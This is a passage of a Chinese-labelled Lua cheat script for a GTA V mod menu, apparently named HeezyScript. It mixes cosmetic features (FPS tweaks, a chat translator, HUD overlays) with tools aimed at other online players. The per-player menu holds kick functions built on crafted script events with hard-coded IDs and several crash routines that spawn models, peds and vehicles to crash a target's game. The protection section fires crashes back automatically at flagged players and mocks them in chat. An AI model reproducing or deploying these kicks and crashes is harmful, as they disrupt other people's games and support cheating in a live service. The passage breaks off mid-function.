    for _, pid in ipairs(players.list(false, true, true)) do
        if players.is_marked_as_attacker(pid,1 << 0x03) or players.is_marked_as_attacker(pid,1 << 0x04) or players.is_marked_as_attacker(pid,1 << 0x05) or players.is_marked_as_attacker(pid,1 << 0x0C) or players.is_marked_as_attacker(pid,1 << 0x0D) or players.is_marked_as_attacker(pid,1 << 0x0E) then
            chat.send_message(PLAYER.GET_PLAYER_NAME(pid)..ridicule,false,true,true)
                break
            end
        end

end)

menu.toggle_loop(protection_options, "崩溃反弹", {"crashrebound"}, "哪个好用用哪个", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        if players.is_marked_as_attacker(pid,1 << 0x03) or players.is_marked_as_attacker(pid,1 << 0x04) or players.is_marked_as_attacker(pid,1 << 0x05) or players.is_marked_as_attacker(pid,1 << 0x0C) or players.is_marked_as_attacker(pid,1 << 0x0D) or players.is_marked_as_attacker(pid,1 << 0x0E) then
            menu.trigger_commands("mathcrash") 
                break
            end
        end

end)

menu.toggle_loop(protection_options, "崩溃反弹2", {"crashrebound2"}, "哪个好用用哪个", function()


    _U_hack_list={}

    while true do

        util.yield(0)

        for pid=0,31 do

            if pid~= PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID) then

                if players.is_marked_as_attacker(pid,1 << 0x03) or players.is_marked_as_attacker(pid,1 << 0x04) or players.is_marked_as_attacker(pid,1 << 0x05) or players.is_marked_as_attacker(pid,1 << 0x0C) or players.is_marked_as_attacker(pid,1 << 0x0D) or players.is_marked_as_attacker(pid,1 << 0x0E) then

                    if not _U_hack_list[pid+1] then

                        menu.trigger_commands("mathcrash") 

                        _U_hack_list[pid+1]=true

                    end

                else

                    _U_hack_list[pid+1]=false

                end

            end

        end

    end

end)



menu.action(protection_options, "强制停止所有声音事件", {""}, "", function()

    for i=-1,100 do

        AUDIO.STOP_SOUND(i)

        AUDIO.RELEASE_SOUND_ID(i)

    end

end)


menu.action(protection_options, "超级清除", {"superclear"}, "", function()
    super_clear()
end)



menu.toggle_loop(protection_options, "连续清除世界", {""}, "", function()

    MISC.CLEAR_AREA(0,0,0 , 1000000, true, true, true, true)

end)



menu.toggle(protection_options, "昏哥模式", {"panic"}, "没错就是自闭", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then

        notification("开启昏哥模式")

        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")

    else

        notification("关闭昏哥模式")

        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end

end)

menu.toggle(protection_options, "提高FPS V1", {"fpsboost"}, "", function(on_toggle)
	if on_toggle then
		notification("正在设置FPS...")
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
        menu.trigger_commands("noidlecam ")
	else
		notification("正在重置FPS...")
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
        menu.trigger_commands("noidlecam ")
		end
	end)

	menu.toggle(protection_options, "提高FPS V2", {"fpsnsboost"}, ".", function(on_toggle)
	if on_toggle then
		notification("正在设置FPS...")
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
        menu.trigger_commands("potatomode ")
        menu.trigger_commands("nosky ")
        menu.trigger_commands("noidlecam ")
	else
		notification("正在重置FPS...")
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
        menu.trigger_commands("potatomode ")
        menu.trigger_commands("nosky ")
        menu.trigger_commands("noidlecam ")
		end
	end)



    lancesp = menu.action(model_options, "加载Spooner", {""}, "", function()
        notification("正在加载Spooner,请稍等")
util.yield(1500)
    require("lib/heezylib/spooner")
    menu.delete(lancesp)
end)

constructs = menu.action(model_options, "加载Constructor", {""}, "", function()
    notification("正在加载constructs,请稍等")
util.yield(1500)
    require("lib/heezylib/Constructor")
    menu.delete(constructs)
end)




island_block = 0

menu.action(world_options, "天空岛", {""}, "", function(on_click)

    local c = {}

    c.x = 0

    c.y = 0

    c.z = 500

    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), c.x, c.y, c.z+5)

    if island_block == 0 or not ENTITY.DOES_ENTITY_EXIST(island_block) then

        request_model_load(1054678467)

        island_block = entities.create_object(1054678467, c)

    end

end)



local qiuqiu = {"生成", "删除"}

menu.list_action(world_options, "球体", {}, "在花园银行顶部生成一个球体", qiuqiu, function(index, value, click_type)

    pluto_switch index do

        case 1:

        aball()

        break

        case 2:

        shanqiu()

    end

end)



meteors = false

menu.toggle(world_options, "一起看流星", {""}, "", function(on)

    if on then

        meteors = true

        start_meteor_shower()

    else

        meteors = false

    end

end, false)





menu.toggle_loop(world_options, "闪电生成", {""}, "", function()

    MISC.FORCE_LIGHTNING_FLASH()

end)



menu.toggle_loop(world_options, "外星人入侵", {}, "", function(toggle)

    ufffo()

end)



menu.toggle_loop(world_options, "定点轰炸", {"pointbombing"}, "定点轰炸", function ()

    local waypointPos = get_waypoint_v3()

    if waypointPos then

        local hash = util.joaat('w_arena_airmissile_01a')

        loadModel(hash)



        waypointPos.z += 30

        local bomb = entities.create_object(hash, waypointPos)

        waypointPos.z -= 30

        ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)

        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)

        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)



        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do

            util.yield_once()

        end

        entities.delete_by_handle(bomb)

        executeNuke(waypointPos)

    end

end)


menu.toggle_loop(world_options, "PED摇头丸", {"pedheadbang"}, "", function(on)
    yaoptou()
end)

menu.toggle(world_options, "安全的战局", {}, "全战局幽灵", function(on)

	if on then

		for pid = 0,30 do

			if players.exists(pid) then

				NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid,true)

			end

		end

	else

		for pid = 0,30 do

			if players.exists(pid) then

				NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid,false)

			end

		end

	end 

end)






menu.toggle_loop(world_options, "跳跳车", {}, '', function(toggle)

	local entities = GET_NEARBY_VEHICLES(PLAYER.PLAYER_ID(), 150)

	for _, vehicle in ipairs(entities) do

		REQUEST_CONTROL(vehicle)

		ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0, 0, 6.5, 0, 0, 0, 0, false, false, true)

	end

	util.yield(1500)

end)


renwujioaben = menu.action(task_options, "加载任务选项", {""}, "", function()

    notification("正在加载任务脚本,请稍等")

util.yield(3000)

    require("lib/heezylib/HC")

    menu.delete(renwujioaben)

end)

MB = menu.action(task_options, "加载自动产业[风险]", {""}, "", function()

    notification("正在加载MB脚本,请稍等")
    menu.delete(MB)
util.yield(3000)

dofile(filesystem.scripts_dir().."\\lib\\heezylib\\MusinessBanagersource.lua")

end)



local Languages = {
	{ Name = "Afrikaans", Key = "af" },
	{ Name = "Albanian", Key = "sq" },
	{ Name = "Arabic", Key = "ar" },
	{ Name = "Azerbaijani", Key = "az" },
	{ Name = "Basque", Key = "eu" },
	{ Name = "Belarusian", Key = "be" },
	{ Name = "Bengali", Key = "bn" },
	{ Name = "Bulgarian", Key = "bg" },
	{ Name = "Catalan", Key = "ca" },
	{ Name = "Chinese Simplified", Key = "zh-cn" },
	{ Name = "Chinese Traditional", Key = "zh-tw" },
	{ Name = "Croatian", Key = "hr" },
	{ Name = "Czech", Key = "cs" },
	{ Name = "Danish", Key = "da" },
	{ Name = "Dutch", Key = "nl" },
	{ Name = "English", Key = "en" },
	{ Name = "Esperanto", Key = "eo" },
	{ Name = "Estonian", Key = "et" },
	{ Name = "Filipino", Key = "tl" },
	{ Name = "Finnish", Key = "fi" },
	{ Name = "French", Key = "fr" },
	{ Name = "Galician", Key = "gl" },
	{ Name = "Georgian", Key = "ka" },
	{ Name = "German", Key = "de" },
	{ Name = "Greek", Key = "el" },
	{ Name = "Gujarati", Key = "gu" },
	{ Name = "Haitian Creole", Key = "ht" },
	{ Name = "Hebrew", Key = "iw" },
	{ Name = "Hindi", Key = "hi" },
	{ Name = "Hungarian", Key = "hu" },
	{ Name = "Icelandic", Key = "is" },
	{ Name = "Indonesian", Key = "id" },
	{ Name = "Irish", Key = "ga" },
	{ Name = "Italian", Key = "it" },
	{ Name = "Japanese", Key = "ja" },
	{ Name = "Kannada", Key = "kn" },
	{ Name = "Korean", Key = "ko" },
	{ Name = "Latin", Key = "la" },
	{ Name = "Latvian", Key = "lv" },
	{ Name = "Lithuanian", Key = "lt" },
	{ Name = "Macedonian", Key = "mk" },
	{ Name = "Malay", Key = "ms" },
	{ Name = "Maltese", Key = "mt" },
	{ Name = "Norwegian", Key = "no" },
	{ Name = "Persian", Key = "fa" },
	{ Name = "Polish", Key = "pl" },
	{ Name = "Portuguese", Key = "pt" },
	{ Name = "Romanian", Key = "ro" },
	{ Name = "Russian", Key = "ru" },
	{ Name = "Serbian", Key = "sr" },
	{ Name = "Slovak", Key = "sk" },
	{ Name = "Slovenian", Key = "sl" },
	{ Name = "Spanish", Key = "es" },
	{ Name = "Swahili", Key = "sw" },
	{ Name = "Swedish", Key = "sv" },
	{ Name = "Tamil", Key = "ta" },
	{ Name = "Telugu", Key = "te" },
	{ Name = "Thai", Key = "th" },
	{ Name = "Turkish", Key = "tr" },
	{ Name = "Ukrainian", Key = "uk" },
	{ Name = "Urdu", Key = "ur" },
	{ Name = "Vietnamese", Key = "vi" },
	{ Name = "Welsh", Key = "cy" },
	{ Name = "Yiddish", Key = "yi" },
}


local LangKeys = {}
local LangName = {}
local LangIndexes = {}
local LangLookupByName = {}
local LangLookupByKey = {}
local PlayerSpooflist = {}
local PlayerSpoof = {}

for i=1,#Languages do
	local Language = Languages[i]
	LangKeys[i] = Language.Name
	LangName[i] = Language.Name
	LangIndexes[Language.Key] = i
	LangLookupByName[Language.Name] = Language.Key
	LangLookupByKey[Language.Key] = Language.Name
end

table.sort(LangKeys)

function encode(text)
	return string.gsub(text, "%s", "+")
end
function decode(text)
	return string.gsub(text, "%+", " ")
end

local chat_translation = menu.list(other_options, "聊天翻译")

settingtrad = menu.list(chat_translation, "翻译设置")
colortradtrad = menu.list(settingtrad, "玩家名称颜色")
menu.on_focus(colortradtrad, function()
	util.yield(50)
	isfocused = false
end)
selectmenu = menu.action(colortradtrad, "已选择 : ".."Color : "..colorselec, {}, "这将保存到配置文件中", function()
	menu.focus(focusref[tonumber(colorselec)])
end)
menu.on_focus(selectmenu, function()
	util.yield(50)
	isfocused = false
end)
for i = 1, 234 do
	focusref[i] = menu.action(colortradtrad, "Color : "..i, {}, "这将保存到配置文件中", function() 
		menu.set_menu_name(selectmenu, "已选择 : ".."Color : "..i)
		colorselec = i
	end)
	menu.on_focus(focusref[i], function()
		isfocused = false
		util.yield(50)
		isfocused = true
		while isfocused do
			if not menu.is_open() then
				isfocused = false
			end
			ptr1 = memory.alloc()
			ptr2 = memory.alloc()
			ptr3 = memory.alloc()
			ptr4 = memory.alloc()
			HUD.GET_HUD_COLOUR(i, ptr1, ptr2, ptr3, ptr4)
			directx.draw_text(0.5, 0.5, "exemple", 5, 0.75, {r = memory.read_int(ptr1)/255, g = memory.read_int(ptr2)/255, b =memory.read_int(ptr3)/255, a= memory.read_int(ptr4)/255}, true)
			util.yield()
		end
	end)
end

menu.text_input(settingtrad, "自定义标签 ["..string.upper(util.get_label_text("MP_CHAT_TEAM")).."] 翻译消息", {"labelteam"}, "将其留空将恢复为原始标签", function(s, click_type)
	if (s == "") then
		teamchatlabel = util.get_label_text("MP_CHAT_TEAM")
	else
		teamchatlabel = s 
	end
	if not (click_type == 4) then
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelteam "..teamchatlabel)
end


menu.text_input(settingtrad, "自定义标签 ["..string.upper(util.get_label_text("MP_CHAT_ALL")).."] 翻译消息", {"labelall"}, "将其留空将恢复为原始标签", function(s, click_type)
	if (s == "") then
		allchatlabel = util.get_label_text("MP_CHAT_ALL")
	else
		allchatlabel = s 
	end
	if not (click_type == 4) then
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelall "..allchatlabel)
end

targetlangmenu = menu.slider_text(chat_translation, "目标语言", {}, "您需要单击以应用更改", LangName, function(s)
	targetlang = LangLookupByName[LangKeys[s]]
end)

tradlocamenu = menu.slider_text(settingtrad, "翻译信息的位置", {}, "您需要单击以应用更改", {"团队聊天不联网", "团队聊天", "全局聊天不联网", "全局聊天", "通知"}, function(s)
	Tradloca = s
end)
	
traductself = false
menu.toggle(settingtrad, "翻译自己", {}, "", function(on)
	traductself = on	
end)
traductsamelang = false
menu.toggle(settingtrad, "即使语言与所需语言相同,也进行翻译", {}, "可能不会正常工作,因为谷歌是个傻瓜", function(on)
	traductsamelang = on	
end)
oldway = false
menu.toggle(settingtrad, "使用旧方法", {}, players.get_name(players.user()).." [全部]玩家:信息", function(on)
	oldway = on	
end)
traduct = true
menu.toggle(chat_translation, "翻译", {}, "", function(on)
	traduct = on	
end, true)

traductmymessage = menu.list(chat_translation, "发送翻译信息")
finallangmenu = menu.slider_text(traductmymessage, "最终语言", {"finallang"}, "翻译成最终语言.您需要单击以应用更改", LangName, function(s)
   targetlangmessagesend = LangLookupByName[LangKeys[s]]
end)

menu.action(traductmymessage, "发送信息", {"Sendmessage"}, "输入消息的文本", function(on_click)
    util.toast("请输入您的消息")
    menu.show_command_box("Sendmessage ")
end, function(on_command)
    mytext = on_command
    async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlangmessagesend.."&dt=t&q="..encode(mytext), function(Sucess)
		if Sucess ~= "" then
			translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
			for _, pId in ipairs(players.list()) do
				chat.send_targeted_message(pId, players.user(), string.gsub(translation, "%+", " "), false)
			end
		end
	end)
    async_http.dispatch()
end)
botsend = false
chat.on_message(function(packet_sender, message_sender, text, team_chat)
	if not botsend then
		if not traductself and (packet_sender == players.user()) then
		else
			if traduct then
				async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlang.."&dt=t&q="..encode(text), function(Sucess)
					if Sucess ~= "" then
						translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
						if not traductsamelang and (sourceLang == targetlang)then
						
						else
							if oldway then
								sender = players.get_name(players.user())
								translationtext = players.get_name(packet_sender).." : "..decode(translation)
								colorfinal = 1
							else
								sender = players.get_name(packet_sender)
								translationtext = decode(translation)
								colorfinal = colorselec
							end
							if (Tradloca == 1) then						
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 2) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), true, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 3) then
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 4) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), false, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 5) then
								util.toast(players.get_name(packet_sender).." : "..decode(translation), TOAST_ALL)
							end
						end
					end
				end)
				async_http.dispatch()
			end
		end
	end
	botsend = false
end)


run = 0
while run<10 do 
	Tradloca = menu.get_value(tradlocamenu)
	targetlangmessagesend = LangLookupByName[LangKeys[menu.get_value(finallangmenu)]]
	targetlang = LangLookupByName[LangKeys[menu.get_value(targetlangmenu)]]
	util.yield()
	run = run+1
end

player_info  = menu.list(other_options, '玩家信息栏', {''}, '')
InfOverlay = menu.action(player_info, "加载玩家信息栏", {""}, "", function()

    notification("正在加载玩家信息,请稍等")

util.yield(100)

dofile(filesystem.scripts_dir().."\\lib\\heezylib\\InfOverlay.lua")

    menu.delete(InfOverlay)

end)

local keyrun = false

local wasdww = menu.list(other_options, '按键显示', {''}, '')

menu.toggle(wasdww, '打开', {'wasd'}, '', function(on) 

	keyrun = on

end, false)

menu.slider(wasdww, 'X轴', {''}, '',1 , 10000, overlay_x * 10000, 20, function(value)

	overlay_x = value / 10000

end)

menu.slider(wasdww, 'Y轴', {''}, '',1 , 10000, overlay_y * 10000, 20, function(value)

	overlay_y = value / 10000

end)

menu.slider(wasdww, '大小', {''}, '',1 , 10000, 300, 20, function(value)

	size = value / 10000

    boxMargin = size / 7

end)

util.create_tick_handler(function()
    if keyrun then
    key_display()
    end
end)



local luacode = menu.list(other_options, "代码")

local executor_code = "util.toast(\"先输入一些代码,笨蛋\")"



local executor_run = function()

    local func = load(executor_code)

    func()

end



menu.text_input(luacode, "输入代码", {"inputLua"}, "输入要执行的Lua代码", function(value)

    executor_code = value

end, executor_code)



menu.action(luacode, "执行代码", {"executeLua"}, "运行上面输入的代码", function() executor_run() end)



local hudminimapmenu = menu.list(other_options, "小地图")

mapzoom = 1

menu.slider(hudminimapmenu, "小地图缩放", {"minimapzoom"}, "", 0, 100, 0, 1, function(s)

    HUD.SET_RADAR_ZOOM_PRECISE(s)

end)



mapangle = 0

menu.slider(hudminimapmenu,"小地图角度", {"minimapanglme"}, "", 0, 360, 0, 1, function(s)

    mapangle = s

end)



mapanglet = off

menu.toggle(hudminimapmenu,"锁定地图角度", {"lockminimapangle"}, "", function(on)

	mapanglet = on

	while mapanglet do

		HUD.LOCK_MINIMAP_ANGLE(mapangle)

		util.yield()

	end

	HUD.UNLOCK_MINIMAP_ANGLE()

end)





menu.toggle(hudminimapmenu,"显示声呐", {"sonaronmap"}, "", function(on)

	HUD.SET_MINIMAP_SONAR_SWEEP(on)

end)



 centermap = off

menu.toggle(hudminimapmenu, "以你为中心的地图", {"centermap"}, "", function(on)

	centermap = on

	while centermap do 

		HUD.DONT_TILT_MINIMAP_THIS_FRAME()

		util.yield()

	end

end)



local misclightmenu = menu.list(other_options, "靓仔")



rlight = 255

menu.slider(misclightmenu, "R", {"lightred"}, "", 0, 255, 255, 1, function(s)

	rlight = s 

end)



glight = 255

menu.slider(misclightmenu, "G", {"lightgreen"}, "", 0, 255, 255, 1, function(s)

	glight = s

end)



blight = 255

menu.slider(misclightmenu, "B", {"lightblue"}, "", 0, 255, 255, 1, function(s)

	blight = s

end)



Radiuslight = 1

menu.slider(misclightmenu, "半径" ,{"lightradius"}, "", 0, 9000, 1, 1, function(s)

	Radiuslight = s

end)



intenslight = 1

menu.slider(misclightmenu, "强度", {"lightintensity"}, "", 0, 1000, 1, 1, function(s)

	intenslight = s

end)

menu.toggle_loop(misclightmenu, "靓仔", {"lighton"}, "", function()

    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())

	GRAPHICS.DRAW_LIGHT_WITH_RANGE(pos.x, pos.y, pos.z, rlight, glight, blight, Radiuslight, intenslight)

end)


menu.action(other_options, "重新启动GTAV", {""}, "", function(on_click)

    MISC.RESTART_GAME()

end)

menu.action(other_options, "打个赌", {}, "赌一赌会不会自崩", function()
    if randomizer(array) == "1" then
        notification("你的游戏幸存了下来")
    else
        notification("看起来你的游戏崩了")
    util.yield(3000)
        ENTITY.APPLY_FORCE_TO_ENTITY(0, 0, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, false)
    end
end)

menu.toggle_loop(other_options, "显示图片", {"picture"}, "", function()
    logo_alpha = 1
    directx.draw_texture(logo, 0.06, 0.1, 0.0, 0.0, 0.86, 0.57, 0, 1, 1, 1, logo_alpha)
end)

menu.toggle_loop(other_options, "时速表", {"speedmeteor"}, "", function()
    local ent
        local ent1 = players.user_ped()
        local ent2 = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
        if PED.IS_PED_IN_ANY_VEHICLE(ent1,true) then
            ent = ent2
        else
            ent = ent1
        end
        local speed = ENTITY.GET_ENTITY_SPEED(ent)
        local speedcalc = speed * 3.6
        myspeed1 = math.ceil(speedcalc)    
        draw_string(string.format("~bold~~italic~~o~"..myspeed1 .. "  ~w~KM/H"), 0.84,0.8, 1,5)
end)

menu.toggle_loop(other_options, "显示时间", {"timeos"}, "", function(state)
    draw_string(string.format(os.date('~bold~~italic~%Y-%m-%d %H:%M:%S', os.time())), 0.83,0.1, 0.5,5)
end)


menu.toggle_loop(other_options, "显示脚本名称", {"scriptname"}, "", function()
    rainbow_color()
    draw_string(string.format("~italic~¦~bold~尊贵的Heezy二代目用户: "..PLAYER.GET_PLAYER_NAME(players.user())), 0.32,0.1, 0.60,5)
end)

menu.toggle_loop(other_options, "主机序列", {"hostqu"}, "", function()
    x1x()
end)

menu.toggle(other_options, "玩家栏", {"playersbar"}, "", function(state)
    bar = state        
    while bar do
    posx = 0.001
    posy = 0.00
    for pid = 0,31 do
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
    color =  {["r"] = 255/255,["g"] = 255/255,["b"] = 255/255,["a"] = 255/255} 
    tags = ""
    network = memory.alloc(13*4)
    name = PLAYER.GET_PLAYER_NAME(pid)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid,network,13)
    if players.is_marked_as_modder(pid) then
        tags = tags .. "[作弊者]"
    color = {["r"] = 255/255,["g"] = 0/255,["b"] = 0/255,["a"] = 255/255}   
    end
    if players.is_godmode(pid) then 
        tags = tags .. "[无敌]"
    color = {["r"] = 255/255,["g"] = 0/255,["b"] = 255/255,["a"] = 255/255} 
    end
    if players.is_in_interior(pid) then
        tags = tags .. "[室内]"
    color = {["r"] = 0/255,["g"] = 255/255,["b"] = 255/255,["a"] = 255/255} 
    end
    if players.is_marked_as_attacker(pid) then
        tags = tags .. "[攻击过你]"
    color = {["r"] = 255/255,["g"] = 255/255,["b"] = 128/255,["a"] = 255/255} 
    end
    if NETWORK.NETWORK_IS_FRIEND(network) then
        tags = tags .. "[好友]"
    color = {["r"] = 7/255,["g"] = 55/255,["b"] = 99/255,["a"] = 255/255}
    end
    if players.get_host() == pid then
        tags = tags .. "[主机]"
    color = {["r"] = 0/255,["g"] = 255/255,["b"] = 0/255,["a"] = 255/255} 
    end
    if players.get_script_host() == pid then
        tags = tags .. "[脚本主机]"
    color = {["r"] = 153/255,["g"] = 0/255,["b"] = 255/255,["a"] = 255/255} 
    end
    memory.free(network)
    directx.draw_text(posx,posy,name.." "..tags,ALIGN_TOP_LEFT,0.5,color)
    posx = posx + 0.145
    if posx > 0.96 then
    posy = posy + 0.0175
    posx = 0.001
    end
    end
    end
    util.yield()
    end
    end)

    local help = true

    menu.toggle(other_options, "使用帮助", {"help"}, "", function(on)
    help = on
    end,true)



menu.toggle_loop(other_options, "捐助名单", {"junzhu"}, "", function()
            draw_string(string.format("~italic~~bold~~p~葵宝"), 0.5,0, 1,5)
            draw_string(string.format("~italic~~bold~~o~KLasombra"), 0.45,0.06, 1,5)
            draw_string(string.format("~italic~~bold~~w~汤姆"), 0.5,0.12, 1,5)
            draw_string(string.format("~italic~~bold~~g~韩序亭"), 0.48,0.18, 1,5)
            draw_string(string.format("~italic~~bold~~y~rip jheng forever"), 0.4,0.24, 1,5)
            draw_string(string.format("~italic~~bold~~r~老V"), 0.5,0.31, 1,5)
            draw_string(string.format("~italic~~bold~~b~天道夷简行"), 0.45,0.37, 1,5)
    end)

menu.toggle_loop(other_options, "秦于澈", {"qyc"}, "", function()
    draw_string(string.format("~italic~~bold~~b~秦~y~于~s~澈"), 0.0,0.0, 3,5)
end)

menu.hyperlink(other_options, "QQ群", "https://jq.qq.com/?_wv=1027&k=QcdI7zwY", "欢迎加入大家庭")

menu.hyperlink(other_options, "线上画质mod", "https://www.bilibili.com/video/BV1KS4y1W76K", "详情请加入UP的群聊")

util.yield(100)



GenerateFeatures = function(PlayerID)

    menu.divider(menu.player_root(PlayerID), "HeezyScript")

    Heezy = menu.list(menu.player_root(PlayerID), "Heezy二代目", {"heezy"}, "", function(); end)

    kick = menu.list(Heezy, "踢出", {}, "", function(); end)

    if menu.get_edition() >= 2 then 
        menu.action(kick, "智能踢 V1", {}, "", function()
            util.trigger_script_event(1 << PlayerID, {915462795, PlayerID, 1, 0, 2, PlayerID, 2700359414448})
            util.trigger_script_event(1 << PlayerID, {1268038438, PlayerID, -1018058175, PlayerID, -1125813865, PlayerID, -1113136291, PlayerID, -2123789977})
            util.trigger_script_event(1 << PlayerID, {243072129, PlayerID, 1, 0, 2, math.random(13, 257), 3, 1})
            menu.trigger_commands("breakup" .. players.get_name(PlayerID))
        end)
    else
        menu.action(kick, "智能踢 V2", {}, "", function()
            util.trigger_script_event(1 << PlayerID, {915462795, PlayerID, 1, 0, 2, PlayerID, 2700359414448})
            util.trigger_script_event(1 << PlayerID, {1268038438, PlayerID, -1018058175, PlayerID, -1125813865, PlayerID, -1113136291, PlayerID, -2123789977})
            util.trigger_script_event(1 << PlayerID, {243072129, PlayerID, 1, 0, 2, math.random(13, 257), 3, 1})
        end)
    end

    menu.action(kick, "脚本踢出v1", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {243072129, 1, 0, 2, math.random(13, 257), 3, 1})
    end)

    menu.action(kick, "脚本踢出v2", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {1268038438, PlayerID, -1018058175, PlayerID, -1125813865, PlayerID, -1113136291, PlayerID, -2123789977})
    end)

    menu.action(kick, "脚本踢出v3", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {915462795, 1, 0, 2, PlayerID, 2700359414448})
    end)

    menu.action(kick, "脚本踢出v4", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {915462795, 1, 0, 2, PlayerID, 2700359414448})
        util.trigger_script_event(1 << PlayerID, {1268038438, PlayerID, -1018058175, PlayerID, -1125813865, PlayerID, -1113136291, PlayerID, -2123789977})
        util.trigger_script_event(1 << PlayerID, {243072129, 1, 0, 2, math.random(13, 257), 3, 1})
    end)

    menu.action(kick, "阻止加入踢", {"blast"}, "将他们踢出并加入到阻止加入列表上", function()

        menu.trigger_commands("historyblock " .. players.get_name(PlayerID))

        menu.trigger_commands("breakup " .. players.get_name(PlayerID))

    end)

    PlayerMainMenu = menu.list(Heezy, "移除", {}, "", function(); end)

    menu.action(PlayerMainMenu, "AIO崩", {}, "远离!!!远离!!!远离!!!远离!!!", function()

    aaio(PlayerID)

    end)

    menu.action(PlayerMainMenu, "制裁XP V1", {"crashxpv1"}, "", function()

        menu.trigger_commands("crash " .. players.get_name(PlayerID))

        menu.trigger_commands("smash " .. players.get_name(PlayerID))

    end)

    menu.action(PlayerMainMenu, "制裁XP V2", {"crashxpv2"}, "", function()
        local cord = players.get_position(PlayerID)
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
        end
        util.toast("Finished.")
    end)
    

    menu.click_slider(PlayerMainMenu,"奥特曼崩(不要靠近和观看）", {"aoteman"}, "1 = V1, 2 = V2, 3 = V3", 1, 3, 1, 1, function(on_change)       

        if on_change == 1 then		

            aotemanv1(PlayerID)

        end

        if on_change == 2 then

            aotemanv2(PlayerID)

        end

        if on_change == 3 then

            aotemanv3(PlayerID)

        end   

    end)

    

    menu.action(PlayerMainMenu, "inshallah crash-----by 伟大的GK", {""}, "", function()

        local TargetPPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))

        local PED1  = CreatePed(28,-1011537562,TargetPPos,0)

        local PED2  = CreatePed(28,-541762431,TargetPPos,0)

        WEAPON.GIVE_WEAPON_TO_PED(PED1,-1813897027,1,true,true)

        WEAPON.GIVE_WEAPON_TO_PED(PED2,-1813897027,1,true,true)

        util.yield(1000)

        TASK.TASK_THROW_PROJECTILE(PED1,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)

        TASK.TASK_THROW_PROJECTILE(PED2,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)

        notification("Finished.")

    end)

    menu.action(PlayerMainMenu, "悲伤的耶稣崩溃", {"grief"}, "可以崩溃大多数菜单.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local pos = players.get_position(PlayerID)
		local mdl = util.joaat("u_m_m_jesus_01")
		local veh_mdl = util.joaat("oppressor")
		util.request_model(veh_mdl)
        util.request_model(mdl)
			for i = 1, 10 do
				if not players.exists(PlayerID) then
					return
				end
				local veh = entities.create_vehicle(veh_mdl, pos, 0)
